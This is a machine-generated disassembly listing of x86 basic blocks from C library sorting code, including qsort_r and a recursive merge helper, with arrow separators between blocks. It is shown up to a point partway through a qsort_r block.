0xb031d06:	mov	dword ptr [esp], edi
0xb031d09:	mov	dword ptr [esp + 8], ecx
0xb031d0d:	call	ebp
None
|
|
|
v
0xb03212b:	mov	esi, dword ptr [esp + 0x158]
0xb032132:	mov	eax, edi
0xb032134:	mov	edx, dword ptr [esp + 0x2c]
0xb032138:	add	esi, edi
0xb03213a:	lea	esi, dword ptr [esi]
0xb032140:	movzx	ecx, byte ptr [eax]
0xb032143:	add	eax, 1
0xb032146:	add	edx, 1
0xb032149:	mov	byte ptr [esp + 0x14], cl
0xb03214d:	movzx	ecx, byte ptr [edx - 1]
0xb032151:	cmp	eax, esi
0xb032153:	mov	byte ptr [eax - 1], cl
0xb032156:	movzx	ecx, byte ptr [esp + 0x14]
0xb03215b:	mov	byte ptr [edx - 1], cl
0xb03215e:	jne	0xb032140
None
|
|
|
v
0xb031de8:	cmp	esi, edi
0xb031dea:	cmove	edi, eax
0xb031ded:	mov	eax, dword ptr [esp + 0x20]
0xb031df1:	add	esi, dword ptr [esp + 0x18]
0xb031df5:	mov	dword ptr [esp + 0x1c], eax
0xb031df9:	cmp	dword ptr [esp + 0x1c], esi
0xb031dfd:	jbe	0xb031d50
None
|
|
|
v
0xb0320f8:	test	eax, eax
0xb0320fa:	jns	0xb031d37
None
|
|
|
v
0xb031d17:	mov	eax, dword ptr [esp + 0x160]
0xb031d1e:	mov	dword ptr [esp + 4], edi
0xb031d22:	mov	dword ptr [esp + 8], eax
0xb031d26:	mov	eax, dword ptr [esp + 0x28]
0xb031d2a:	mov	dword ptr [esp], eax
0xb031d2d:	call	ebp
None
|
|
|
v
0xb031f00:	movzx	ecx, byte ptr [edi]
0xb031f03:	add	edi, 1
0xb031f06:	add	eax, 1
0xb031f09:	movzx	edx, byte ptr [eax - 1]
0xb031f0d:	cmp	edi, esi
0xb031f0f:	mov	byte ptr [edi - 1], dl
0xb031f12:	mov	byte ptr [eax - 1], cl
0xb031f15:	jne	0xb031f00
None
|
|
|
v
0xb031d68:	test	eax, eax
0xb031d6a:	jns	0xb031d7c
None
|
|
|
v
0xb031ded:	mov	eax, dword ptr [esp + 0x20]
0xb031df1:	add	esi, dword ptr [esp + 0x18]
0xb031df5:	mov	dword ptr [esp + 0x1c], eax
0xb031df9:	cmp	dword ptr [esp + 0x1c], esi
0xb031dfd:	jbe	0xb031d50
None
|
|
|
v
0xb032165:	mov	dword ptr [esp + 0x28], esi
0xb032169:	jmp	0xb031e40
None
|
|
|
v
0xb032140:	movzx	ecx, byte ptr [eax]
0xb032143:	add	eax, 1
0xb032146:	add	edx, 1
0xb032149:	mov	byte ptr [esp + 0x14], cl
0xb03214d:	movzx	ecx, byte ptr [edx - 1]
0xb032151:	cmp	eax, esi
0xb032153:	mov	byte ptr [eax - 1], cl
0xb032156:	movzx	ecx, byte ptr [esp + 0x14]
0xb03215b:	mov	byte ptr [edx - 1], cl
0xb03215e:	jne	0xb032140
None
|
|
|
v
0xb031d9e:	mov	eax, dword ptr [esp + 0x1c]
0xb031da2:	mov	edx, esi
0xb031da4:	mov	ecx, dword ptr [esp + 0x158]
0xb031dab:	mov	dword ptr [esp + 0x24], esi
0xb031daf:	add	ecx, eax
0xb031db1:	mov	dword ptr [esp + 0x20], ecx
0xb031db5:	mov	esi, ecx
0xb031db7:	nop	
0xb031db8:	movzx	ecx, byte ptr [eax]
0xb031dbb:	add	eax, 1
0xb031dbe:	add	edx, 1
0xb031dc1:	mov	byte ptr [esp + 0x14], cl
0xb031dc5:	movzx	ecx, byte ptr [edx - 1]
0xb031dc9:	cmp	eax, esi
0xb031dcb:	mov	byte ptr [eax - 1], cl
0xb031dce:	movzx	ecx, byte ptr [esp + 0x14]
0xb031dd3:	mov	byte ptr [edx - 1], cl
0xb031dd6:	jne	0xb031db8
None
|
|
|
v
0xb031d94:	cmp	dword ptr [esp + 0x1c], esi
0xb031d98:	jae	0xb032010
None
|
|
|
v
0xb031fb0:	mov	dword ptr [esp + 0x14], edx
0xb031fb4:	lea	esi, dword ptr [esi]
0xb031fb8:	mov	ecx, dword ptr [esp + 0x14]
0xb031fbc:	movzx	eax, byte ptr [ebp]
0xb031fc0:	cmp	esi, ecx
0xb031fc2:	mov	byte ptr [esp + 0x18], al
0xb031fc6:	mov	eax, ecx
0xb031fc8:	ja	0xb03207e
None
|
|
|
v
0xb032085:	mov	edi, esi
0xb032087:	jmp	0xb031ded
None
|
|
|
v
0xb031e58:	add	esp, 0x140
0xb031e5e:	pop	esi
0xb031e5f:	pop	edi
0xb031e60:	pop	ebp
0xb031e61:	ret	
None
|
|
|
v
0xb031d6c:	jmp	0xb03206e
None
|
|
|
v
0xb031eaf:	mov	esi, edi
0xb031eb1:	mov	edi, eax
0xb031eb3:	nop	
0xb031eb4:	lea	esi, dword ptr [esi]
0xb031eb8:	mov	eax, dword ptr [esp + 0x160]
0xb031ebf:	mov	dword ptr [esp + 4], esi
0xb031ec3:	mov	dword ptr [esp], edi
0xb031ec6:	mov	dword ptr [esp + 8], eax
0xb031eca:	call	ebp
None
|
|
|
v
0xb03208c:	mov	eax, dword ptr [esp + 0x20]
0xb032090:	mov	ecx, dword ptr [esp + 0x158]
0xb032097:	add	eax, ecx
0xb032099:	mov	dword ptr [esp + 0x24], eax
0xb03209d:	mov	eax, dword ptr [esp + 0x24]
0xb0320a1:	mov	dword ptr [esp + 0x20], eax
0xb0320a5:	jmp	0xb031f38
None
|
|
|
v
0xb032035:	mov	edx, dword ptr [esp + 0x28]
0xb032039:	sub	edx, dword ptr [esp + 0x1c]
0xb03203d:	cmp	dword ptr [esp + 0x34], edx
0xb032041:	jae	0xb032165
None
|
|
|
v
0xb031f82:	test	eax, eax
0xb031f84:	js	0xb031f68
None
|
|
|
v
0xb032126:	jmp	0xb031d37
None
|
|
|
v
0xb031eb8:	mov	eax, dword ptr [esp + 0x160]
0xb031ebf:	mov	dword ptr [esp + 4], esi
0xb031ec3:	mov	dword ptr [esp], edi
0xb031ec6:	mov	dword ptr [esp + 8], eax
0xb031eca:	call	ebp
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b032190
TOTAL BLOCKS :66
0xb032338:	add	eax, 4
0xb03233b:	mov	edx, dword ptr [eax - 4]
0xb03233e:	add	esi, 4
0xb032341:	cmp	ebp, esi
0xb032343:	mov	dword ptr [esi - 4], edx
0xb032346:	ja	0xb032338
None
|
|
|
v
0xb032440:	mov	eax, dword ptr [ebp]
0xb032443:	sub	edi, 1
0xb032446:	add	ebp, 4
0xb032449:	mov	dword ptr [esi], eax
0xb03244b:	add	esi, 4
0xb03244e:	test	edi, edi
0xb032450:	je	0xb032350
None
|
|
|
v
0xb03250f:	mov	eax, dword ptr [esp + 0x2c]
0xb032513:	mov	dword ptr [esp + 0x14], eax
0xb032517:	jmp	0xb032350
None
|
|
|
v
0xb032226:	test	edi, edi
0xb032228:	je	0xb03250f
None
|
|
|
v
0xb032421:	test	edi, edi
0xb032423:	mov	eax, dword ptr [esp + 0x2c]
0xb032427:	je	0xb03251c
None
|
|
|
v
0xb032382:	add	esp, 0x3c
0xb032385:	pop	ebx
0xb032386:	pop	esi
0xb032387:	pop	edi
0xb032388:	pop	ebp
0xb032389:	ret	
None
|
|
|
v
0xb0323fb:	jmp	0xb032350
None
|
|
|
v
0xb032493:	test	edi, edi
0xb032495:	je	0xb03250f
None
|
|
|
v
0xb0324c1:	add	esi, 8
0xb0324c4:	test	edi, edi
0xb0324c6:	je	0xb032350
None
|
|
|
v
0xb0323e2:	mov	dword ptr [esp + 4], ebp
0xb0323e6:	sub	edi, 1
0xb0323e9:	mov	dword ptr [esp], esi
0xb0323ec:	call	0xb07cad0
None
|
|
|
v
0xb032400:	mov	ecx, dword ptr [esp + 0x14]
0xb032404:	mov	dword ptr [esp], esi
0xb032407:	mov	dword ptr [esp + 4], ecx
0xb03240b:	call	0xb07cad0
None
|
|
|
v
0xb032314:	mov	ecx, dword ptr [esp + 0x24]
0xb032318:	test	eax, eax
0xb03231a:	jle	0xb032390
None
|
|
|
v
0xb0321d4:	mov	eax, dword ptr [esp + 0x28]
0xb0321d8:	mov	edx, ebp
0xb0321da:	mov	dword ptr [esp], edi
0xb0321dd:	call	0xb032190
None
|
|
|
v
0xb0323a9:	mov	eax, dword ptr [esp + 0x2c]
0xb0323ad:	mov	dword ptr [esp + 0x14], eax
0xb0323b1:	test	edi, edi
0xb0323b3:	je	0xb032350
None
|
|
|
v
0xb032350:	mov	eax, dword ptr [esp + 0x10]
0xb032354:	test	eax, eax
0xb032356:	jne	0xb0322b0
None
|
|
|
v
0xb032410:	sub	dword ptr [esp + 0x10], 1
0xb032415:	mov	esi, eax
0xb032417:	mov	eax, dword ptr [esp + 0x20]
0xb03241b:	add	dword ptr [esp + 0x14], eax
0xb03241f:	jmp	0xb0323b1
None
|
|
|
v
0xb0322e2:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0324f5:	mov	eax, dword ptr [esp + 0x14]
0xb0324f9:	sub	dword ptr [esp + 0x10], 1
0xb0324fe:	add	dword ptr [esp + 0x14], 8
0xb032503:	mov	edx, dword ptr [eax + 4]
0xb032506:	mov	eax, dword ptr [eax]
0xb032508:	mov	dword ptr [esi + 4], edx
0xb03250b:	mov	dword ptr [esi], eax
0xb03250d:	jmp	0xb0324c1
None
|
|
|
v
0xb032190:	push	ebp
0xb032191:	push	edi
0xb032192:	push	esi
0xb032193:	push	ebx
0xb032194:	sub	esp, 0x3c
0xb032197:	mov	ecx, dword ptr [eax]
0xb032199:	mov	esi, dword ptr [esp + 0x50]
0xb03219d:	mov	edi, dword ptr [esp + 0x50]
0xb0321a1:	call	0xb1267db
None
|
|
|
v
0xb0323f1:	add	ebp, dword ptr [esp + 0x20]
0xb0323f5:	test	edi, edi
0xb0323f7:	mov	esi, eax
0xb0323f9:	jne	0xb0323b5
None
|
|
|
v
0xb0323d6:	test	eax, eax
0xb0323d8:	mov	eax, dword ptr [esp + 0x20]
0xb0323dc:	mov	dword ptr [esp + 8], eax
0xb0323e0:	jle	0xb032400
None
|
|
|
v
0xb0321a6:	add	ebx, 0x178e5a
0xb0321ac:	mov	dword ptr [esp + 0x28], eax
0xb0321b0:	shr	esi, 1
0xb0321b2:	imul	ecx, esi
0xb0321b5:	sub	edi, esi
0xb0321b7:	cmp	esi, 1
0xb0321ba:	mov	dword ptr [esp + 0x2c], edx
0xb0321be:	mov	dword ptr [esp + 0x10], esi
0xb0321c2:	lea	ebp, dword ptr [edx + ecx]
0xb0321c5:	jbe	0xb0321cf
None
|
|
|
v
0xb03251c:	mov	dword ptr [esp + 0x14], eax
0xb032520:	jmp	0xb032350
None
|
|
|
v
0xb0322cd:	jmp	0xb03235c
None
|
|
|
v
0xb032263:	mov	eax, dword ptr [esp + 0x1c]
0xb032267:	mov	dword ptr [esp + 0x14], ecx
0xb03226b:	mov	dword ptr [esp + 8], eax
0xb03226f:	mov	eax, dword ptr [ebp]
0xb032272:	mov	dword ptr [esp + 4], eax
0xb032276:	mov	eax, dword ptr [ecx]
0xb032278:	mov	dword ptr [esp], eax
0xb03227b:	mov	eax, dword ptr [esp + 0x18]
0xb03227f:	call	eax
None
|
|
|
v
0xb0324b0:	mov	eax, dword ptr [ebp]
0xb0324b3:	sub	edi, 1
0xb0324b6:	add	ebp, 8
0xb0324b9:	mov	edx, dword ptr [ebp - 4]
0xb0324bc:	mov	dword ptr [esi], eax
0xb0324be:	mov	dword ptr [esi + 4], edx
0xb0324c1:	add	esi, 8
0xb0324c4:	test	edi, edi
0xb0324c6:	je	0xb032350
None
|
|
|
v
0xb0324d8:	mov	eax, dword ptr [esp + 0x1c]
0xb0324dc:	mov	dword ptr [esp + 4], ebp
0xb0324e0:	mov	dword ptr [esp + 8], eax
0xb0324e4:	mov	eax, dword ptr [esp + 0x14]
0xb0324e8:	mov	dword ptr [esp], eax
0xb0324eb:	mov	eax, dword ptr [esp + 0x18]
0xb0324ef:	call	eax
None
|
|
|
v
0xb032218:	cmp	eax, 3
0xb03221b:	nop	
0xb03221c:	lea	esi, dword ptr [esi]
0xb032220:	jne	0xb0323a9
None
|
|
|
v
0xb0322a0:	mov	eax, dword ptr [esp + 0x10]
0xb0322a4:	mov	dword ptr [esp + 0x14], ecx
0xb0322a8:	test	eax, eax
0xb0322aa:	je	0xb03235c
None
|
|
|
v
0xb03247b:	test	eax, eax
0xb03247d:	jg	0xb032440
None
|
|
|
v
0xb032456:	mov	eax, dword ptr [esp + 0x10]
0xb03245a:	test	eax, eax
0xb03245c:	je	0xb032350
None
|
|
|
v
0xb03229d:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb032390:	mov	edx, dword ptr [esp + 0x14]
0xb032394:	mov	eax, dword ptr [esp + 0x20]
0xb032398:	sub	dword ptr [esp + 0x10], 1
0xb03239d:	mov	dword ptr [esp + 0x24], edx
0xb0323a1:	add	eax, edx
0xb0323a3:	mov	dword ptr [esp + 0x14], eax
0xb0323a7:	jmp	0xb032329
None
|
|
|
v
0xb0321c7:	mov	dword ptr [esp], esi
0xb0321ca:	call	0xb032190
None
|
|
|
v
0xb0324a7:	jmp	0xb03250f
None
|
|
|
v
0xb03242d:	mov	edx, dword ptr [esp + 0x10]
0xb032431:	test	edx, edx
0xb032433:	je	0xb03251c
None
|
|
|
v
0xb0324cc:	mov	eax, dword ptr [esp + 0x10]
0xb0324d0:	test	eax, eax
0xb0324d2:	je	0xb032350
None
|
|
|
v
0xb032497:	mov	ecx, dword ptr [esp + 0x10]
0xb03249b:	mov	eax, dword ptr [esp + 0x2c]
0xb03249f:	test	ecx, ecx
0xb0324a1:	mov	dword ptr [esp + 0x14], eax
0xb0324a5:	jne	0xb0324d8
None
|
|
|
v
0xb03244b:	add	esi, 4
0xb03244e:	test	edi, edi
0xb032450:	je	0xb032350
None
|
|
|
v
0xb032289:	mov	eax, dword ptr [ecx]
0xb03228b:	add	esi, 4
0xb03228e:	add	ecx, 4
0xb032291:	sub	dword ptr [esp + 0x10], 1
0xb032296:	mov	dword ptr [esi - 4], eax
0xb032299:	test	edi, edi
0xb03229b:	jne	0xb03225b
None
|
|
|
v
0xb0322f0:	mov	eax, dword ptr [esp + 0x20]
0xb0322f4:	mov	dword ptr [esp + 0x24], ecx
0xb0322f8:	mov	dword ptr [esp + 4], edi
0xb0322fc:	lea	ebp, dword ptr [esi + eax]
0xb0322ff:	mov	eax, dword ptr [esp + 0x1c]
0xb032303:	mov	dword ptr [esp + 8], eax
0xb032307:	mov	eax, dword ptr [esp + 0x14]
0xb03230b:	mov	dword ptr [esp], eax
0xb03230e:	mov	eax, dword ptr [esp + 0x18]
0xb032312:	call	eax
None
|
|
|
v
0xb032439:	mov	dword ptr [esp + 0x14], eax
0xb03243d:	jmp	0xb032462
None
|
|
|
v
0xb03234e:	mov	edi, ecx
0xb032350:	mov	eax, dword ptr [esp + 0x10]
0xb032354:	test	eax, eax
0xb032356:	jne	0xb0322b0
None
|
|
|
v
0xb0322b0:	mov	eax, dword ptr [esp + 0x10]
0xb0322b4:	imul	eax, dword ptr [esp + 0x20]
0xb0322b9:	mov	dword ptr [esp], esi
0xb0322bc:	mov	dword ptr [esp + 8], eax
0xb0322c0:	mov	eax, dword ptr [esp + 0x14]
0xb0322c4:	mov	dword ptr [esp + 4], eax
0xb0322c8:	call	0xb07d0b0
None
|
|
|
v
0xb0323b5:	mov	edx, dword ptr [esp + 0x10]
0xb0323b9:	test	edx, edx
0xb0323bb:	je	0xb032350
None
|
|
|
v
0xb03225b:	mov	eax, dword ptr [esp + 0x10]
0xb03225f:	test	eax, eax
0xb032261:	je	0xb0322a0
None
|
|
|
v
0xb032248:	mov	eax, dword ptr [ebp]
0xb03224b:	sub	edi, 1
0xb03224e:	add	ebp, 4
0xb032251:	add	esi, 4
0xb032254:	mov	dword ptr [esi - 4], eax
0xb032257:	test	edi, edi
0xb032259:	je	0xb0322a0
None
|
|
|
v
0xb0322e8:	mov	eax, dword ptr [esp + 0x10]
0xb0322ec:	test	eax, eax
0xb0322ee:	je	0xb03234e
None
|
|
|
v
0xb032462:	mov	eax, dword ptr [esp + 0x1c]
0xb032466:	mov	dword ptr [esp + 4], ebp
0xb03246a:	mov	dword ptr [esp + 8], eax
0xb03246e:	mov	eax, dword ptr [esp + 0x14]
0xb032472:	mov	dword ptr [esp], eax
0xb032475:	mov	eax, dword ptr [esp + 0x18]
0xb032479:	call	eax
None
|
|
|
v
0xb0323bd:	mov	eax, dword ptr [esp + 0x1c]
0xb0323c1:	mov	dword ptr [esp + 4], ebp
0xb0323c5:	mov	dword ptr [esp + 8], eax
0xb0323c9:	mov	eax, dword ptr [esp + 0x14]
0xb0323cd:	mov	dword ptr [esp], eax
0xb0323d0:	mov	eax, dword ptr [esp + 0x18]
0xb0323d4:	call	eax
None
|
|
|
v
0xb03247f:	mov	eax, dword ptr [esp + 0x14]
0xb032483:	sub	dword ptr [esp + 0x10], 1
0xb032488:	add	dword ptr [esp + 0x14], 4
0xb03248d:	mov	eax, dword ptr [eax]
0xb03248f:	mov	dword ptr [esi], eax
0xb032491:	jmp	0xb03244b
None
|
|
|
v
0xb032242:	jmp	0xb03250f
None
|
|
|
v
0xb0321cf:	cmp	edi, 1
0xb0321d2:	jbe	0xb0321e2
None
|
|
|
v
0xb032209:	jb	0xb032421
None
|
|
|
v
0xb03235c:	mov	eax, dword ptr [esp + 0x28]
0xb032360:	mov	edx, dword ptr [esp + 0x50]
0xb032364:	mov	eax, dword ptr [eax + 0x10]
0xb032367:	sub	edx, edi
0xb032369:	imul	edx, dword ptr [esp + 0x20]
0xb03236e:	mov	dword ptr [esp + 4], eax
0xb032372:	mov	eax, dword ptr [esp + 0x2c]
0xb032376:	mov	dword ptr [esp + 8], edx
0xb03237a:	mov	dword ptr [esp], eax
0xb03237d:	call	0xb07d0b0
None
|
|
|
v
0xb0321e2:	mov	eax, dword ptr [esp + 0x28]
0xb0321e6:	mov	ecx, dword ptr [eax]
0xb0321e8:	mov	esi, dword ptr [eax + 0x10]
0xb0321eb:	mov	dword ptr [esp + 0x20], ecx
0xb0321ef:	mov	ecx, dword ptr [eax + 8]
0xb0321f2:	mov	dword ptr [esp + 0x18], ecx
0xb0321f6:	mov	ecx, dword ptr [eax + 0xc]
0xb0321f9:	mov	eax, dword ptr [eax + 4]
0xb0321fc:	mov	dword ptr [esp + 0x1c], ecx
0xb032200:	cmp	eax, 1
0xb032203:	je	0xb032493
None
|
|
|
v
0xb032331:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb03231c:	mov	edx, dword ptr [esp + 0x20]
0xb032320:	sub	ecx, 1
0xb032323:	mov	dword ptr [esp + 0x24], edi
0xb032327:	add	edi, edx
0xb032329:	cmp	esi, ebp
0xb03232b:	mov	eax, dword ptr [esp + 0x24]
0xb03232f:	jae	0xb032348
None
|
|
|
v
0xb0322d2:	mov	eax, dword ptr [esp + 0x2c]
0xb0322d6:	mov	ecx, edi
0xb0322d8:	mov	edi, ebp
0xb0322da:	test	ecx, ecx
0xb0322dc:	mov	dword ptr [esp + 0x14], eax
0xb0322e0:	je	0xb03234e
None
|
|
|
v
0xb032281:	mov	ecx, dword ptr [esp + 0x14]
0xb032285:	test	eax, eax
0xb032287:	jg	0xb032248
None
|
|
|
v
0xb0324f1:	test	eax, eax
0xb0324f3:	jg	0xb0324b0
None
|
|
|
v
0xb03220f:	cmp	eax, 2
0xb032212:	je	0xb0322d2
None
|
|
|
v
0xb03222e:	mov	eax, dword ptr [esp + 0x2c]
0xb032232:	mov	dword ptr [esp + 0x14], eax
0xb032236:	mov	eax, dword ptr [esp + 0x10]
0xb03223a:	mov	ecx, dword ptr [esp + 0x14]
0xb03223e:	test	eax, eax
0xb032240:	jne	0xb032263
None
|
|
|
v
0xb032348:	test	ecx, ecx
0xb03234a:	mov	esi, ebp
0xb03234c:	jne	0xb0322e8
None
|
|
|
v
0xb032329:	cmp	esi, ebp
0xb03232b:	mov	eax, dword ptr [esp + 0x24]
0xb03232f:	jae	0xb032348
None
|
|
|
v
0xb0323b1:	test	edi, edi
0xb0323b3:	je	0xb032350
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:qsort_r
TOTAL BLOCKS :48
0xb03279e:	mov	dword ptr [esp], 0x55
0xb0327a5:	call	0xb0b79d0
None
|
|
|
v
0xb0326d4:	add	dword ptr [ebp - 0x48], 1
0xb0326d8:	mov	eax, dword ptr [ebp + 0x10]
0xb0326db:	add	dword ptr [ebp - 0x44], eax
0xb0326de:	mov	eax, dword ptr [ebp - 0x48]
0xb0326e1:	cmp	eax, dword ptr [ebp + 0xc]
0xb0326e4:	jne	0xb032650
None
|
|
|
v
0xb032680:	mov	ecx, edi
0xb032682:	mov	edi, eax
0xb032684:	mov	dword ptr [ebp - 0x40], esi
0xb032687:	mov	eax, edi
0xb032689:	xor	edx, edx
0xb03268b:	sub	eax, dword ptr [ebp + 8]
0xb03268e:	div	dword ptr [ebp + 0x10]
0xb032691:	mov	edx, dword ptr [ebp - 0x40]
0xb032694:	mov	esi, eax
0xb032696:	mov	eax, dword ptr [ebp - 0x3c]
0xb032699:	mov	dword ptr [eax + edx*4], ecx
0xb03269c:	mov	edx, dword ptr [ebp + 0x10]
0xb03269f:	mov	dword ptr [esp + 4], edi
0xb0326a3:	mov	dword ptr [esp], ecx
0xb0326a6:	mov	dword ptr [esp + 8], edx
0xb0326aa:	call	0xb07d0b0
None
|
|
|
v
0xb0327aa:	mov	edx, 0x1fffffff
0xb0327af:	cmp	eax, 0xff
0xb0327b2:	je	0xb0327bf
None
|
|
|
v
0xb032758:	cmp	dword ptr [ebp + 0xc], 1
0xb03275c:	jbe	0xb0326ea
None
|
|
|
v
0xb03280c:	mov	dword ptr [ebp - 0x28], 0
0xb032813:	jmp	0xb032758
None
|
|
|
v
0xb0326f5:	lea	esp, dword ptr [ebp - 0xc]
0xb0326f8:	pop	ebx
0xb0326f9:	pop	esi
0xb0326fa:	pop	edi
0xb0326fb:	pop	ebp
0xb0326fc:	ret	
None
|
|
|
v
0xb0327de:	mov	eax, dword ptr [ebp + 0xc]
0xb0327e1:	test	eax, eax
0xb0327e3:	jne	0xb03263f
None
|
|
|
v
0xb032614:	add	ecx, dword ptr [ebp - 0x1c]
0xb032617:	mov	edx, ecx
0xb032619:	cmp	dword ptr [ebp + 0xc], 1
0xb03261d:	mov	dword ptr [ebp - 0x2c], 4
0xb032624:	mov	dword ptr [ebp - 0x28], 3
0xb03262b:	jbe	0xb0327de
None
|
|
|
v
0xb03276f:	mov	eax, dword ptr [ebp - 0x50]
0xb032772:	mov	dword ptr [esp], eax
0xb032775:	call	0xb017470
None
|
|
|
v
0xb032544:	add	ebx, 0x178abc
0xb03254a:	lea	esi, dword ptr [eax + esi*8]
0xb03254d:	mov	eax, dword ptr [ebp + 0xc]
0xb032550:	imul	eax, dword ptr [ebp + 0x10]
0xb032554:	cmp	dword ptr [ebp + 0x10], 0x20
0xb032558:	cmovbe	esi, eax
0xb03255b:	cmp	esi, 0x3ff
0xb032561:	jbe	0xb032780
None
|
|
|
v
0xb032530:	push	ebp
0xb032531:	mov	ebp, esp
0xb032533:	push	edi
0xb032534:	push	esi
0xb032535:	push	ebx
0xb032536:	sub	esp, 0x5c
0xb032539:	mov	eax, dword ptr [ebp + 0x10]
0xb03253c:	mov	esi, dword ptr [ebp + 0xc]
0xb03253f:	call	0xb1267db
None
|
|
|
v
0xb0327d1:	mov	dword ptr [ebx + 0x11bc], eax
0xb0327d7:	mov	ecx, eax
0xb0327d9:	jmp	0xb032577
None
|
|
|
v
0xb032676:	mov	eax, dword ptr [ebp - 0x48]
0xb032679:	mov	ecx, esi
0xb03267b:	mov	dword ptr [ebp - 0x40], eax
0xb03267e:	jmp	0xb032687
None
|
|
|
v
0xb032727:	lea	esp, dword ptr [ebp - 0xc]
0xb03272a:	pop	ebx
0xb03272b:	pop	esi
0xb03272c:	pop	edi
0xb03272d:	pop	ebp
0xb03272e:	ret	
None
|
|
|
v
0xb032730:	test	byte ptr [ebp + 0x10], 3
0xb032734:	jne	0xb032758
None
|
|
|
v
0xb0327ee:	test	byte ptr [ebp + 8], 7
0xb0327f2:	jne	0xb032750
None
|
|
|
v
0xb032750:	mov	dword ptr [ebp - 0x28], 2
0xb032757:	nop	
0xb032758:	cmp	dword ptr [ebp + 0xc], 1
0xb03275c:	jbe	0xb0326ea
None
|
|
|
v
0xb0326af:	mov	eax, dword ptr [ebp - 0x3c]
0xb0326b2:	lea	edx, dword ptr [eax + esi*4]
0xb0326b5:	mov	eax, dword ptr [edx]
0xb0326b7:	cmp	eax, dword ptr [ebp - 0x44]
0xb0326ba:	jne	0xb032680
None
|
|
|
v
0xb032687:	mov	eax, edi
0xb032689:	xor	edx, edx
0xb03268b:	sub	eax, dword ptr [ebp + 8]
0xb03268e:	div	dword ptr [ebp + 0x10]
0xb032691:	mov	edx, dword ptr [ebp - 0x40]
0xb032694:	mov	esi, eax
0xb032696:	mov	eax, dword ptr [ebp - 0x3c]
0xb032699:	mov	dword ptr [eax + edx*4], ecx
0xb03269c:	mov	edx, dword ptr [ebp + 0x10]
0xb03269f:	mov	dword ptr [esp + 4], edi
0xb0326a3:	mov	dword ptr [esp], ecx
0xb0326a6:	mov	dword ptr [esp + 8], edx
0xb0326aa:	call	0xb07d0b0
None
|
|
|
v
0xb032804:	mov	edx, dword ptr [ebp - 0x3c]
0xb032807:	jmp	0xb032619
None
|
|
|
v
0xb0327b4:	test	eax, eax
0xb0327b6:	lea	edx, dword ptr [eax + 3]
0xb0327b9:	cmovns	edx, eax
0xb0327bc:	sar	edx, 2
0xb0327bf:	mov	dword ptr [ebx + 0x11b8], edx
0xb0327c5:	mov	dword ptr [esp], 0x1e
0xb0327cc:	call	0xb0b79d0
None
|
|
|
v
0xb03275e:	mov	ecx, dword ptr [ebp + 0xc]
0xb032761:	lea	eax, dword ptr [ebp - 0x2c]
0xb032764:	mov	edx, dword ptr [ebp + 8]
0xb032767:	mov	dword ptr [esp], ecx
0xb03276a:	call	0xb032190
None
|
|
|
v
0xb032736:	test	byte ptr [ebp + 8], 3
0xb03273a:	jne	0xb032758
None
|
|
|
v
0xb032650:	mov	ecx, dword ptr [ebp - 0x3c]
0xb032653:	mov	eax, dword ptr [ebp - 0x48]
0xb032656:	mov	esi, dword ptr [ebp - 0x44]
0xb032659:	mov	edi, dword ptr [ecx + eax*4]
0xb03265c:	cmp	edi, esi
0xb03265e:	je	0xb0326d4
None
|
|
|
v
0xb0327bf:	mov	dword ptr [ebx + 0x11b8], edx
0xb0327c5:	mov	dword ptr [esp], 0x1e
0xb0327cc:	call	0xb0b79d0
None
|
|
|
v
0xb032660:	mov	ecx, dword ptr [ebp + 0x10]
0xb032663:	mov	dword ptr [esp + 4], esi
0xb032667:	mov	dword ptr [esp + 8], ecx
0xb03266b:	mov	ecx, dword ptr [ebp - 0x4c]
0xb03266e:	mov	dword ptr [esp], ecx
0xb032671:	call	0xb07d0b0
None
|
|
|
v
0xb0325be:	mov	eax, dword ptr [ebp + 0x10]
0xb0325c1:	cmp	dword ptr [ebp + 0x10], 0x20
0xb0325c5:	mov	dword ptr [ebp - 0x28], 4
0xb0325cc:	mov	dword ptr [ebp - 0x2c], eax
0xb0325cf:	mov	eax, dword ptr [ebp + 0x14]
0xb0325d2:	mov	dword ptr [ebp - 0x24], eax
0xb0325d5:	mov	eax, dword ptr [ebp + 0x18]
0xb0325d8:	mov	dword ptr [ebp - 0x20], eax
0xb0325db:	jbe	0xb032730
None
|
|
|
v
0xb0325bb:	mov	dword ptr [ebp - 0x1c], eax
0xb0325be:	mov	eax, dword ptr [ebp + 0x10]
0xb0325c1:	cmp	dword ptr [ebp + 0x10], 0x20
0xb0325c5:	mov	dword ptr [ebp - 0x28], 4
0xb0325cc:	mov	dword ptr [ebp - 0x2c], eax
0xb0325cf:	mov	eax, dword ptr [ebp + 0x14]
0xb0325d2:	mov	dword ptr [ebp - 0x24], eax
0xb0325d5:	mov	eax, dword ptr [ebp + 0x18]
0xb0325d8:	mov	dword ptr [ebp - 0x20], eax
0xb0325db:	jbe	0xb032730
None
|
|
|
v
0xb0325a4:	mov	ecx, dword ptr [ebx - 0xdc]
0xb0325aa:	mov	edx, dword ptr [ebp - 0x3c]
0xb0325ad:	mov	dword ptr [edi + ecx], edx
0xb0325b0:	test	eax, eax
0xb0325b2:	mov	dword ptr [ebp - 0x50], eax
0xb0325b5:	je	0xb032700
None
|
|
|
v
0xb032601:	mov	edx, dword ptr [ebp + 8]
0xb032604:	mov	edi, dword ptr [ebp + 0x10]
0xb032607:	nop	
0xb032608:	add	eax, 4
0xb03260b:	mov	dword ptr [eax - 4], edx
0xb03260e:	add	edx, edi
0xb032610:	cmp	esi, eax
0xb032612:	ja	0xb032608
None
|
|
|
v
0xb0327f8:	mov	dword ptr [ebp - 0x28], 1
0xb0327ff:	jmp	0xb032758
None
|
|
|
v
0xb032780:	lea	eax, dword ptr [esi + 0x1e]
0xb032783:	and	eax, 0xfffffff0
0xb032786:	sub	esp, eax
0xb032788:	lea	eax, dword ptr [esp + 0x23]
0xb03278c:	and	eax, 0xfffffff0
0xb03278f:	mov	dword ptr [ebp - 0x1c], eax
0xb032792:	mov	dword ptr [ebp - 0x50], 0
0xb032799:	jmp	0xb0325be
None
|
|
|
v
0xb0325e1:	mov	eax, dword ptr [ebp + 0xc]
0xb0325e4:	lea	ecx, dword ptr [eax*4]
0xb0325eb:	mov	eax, dword ptr [ebp - 0x1c]
0xb0325ee:	add	eax, ecx
0xb0325f0:	lea	esi, dword ptr [eax + ecx]
0xb0325f3:	cmp	eax, esi
0xb0325f5:	mov	dword ptr [ebp - 0x3c], eax
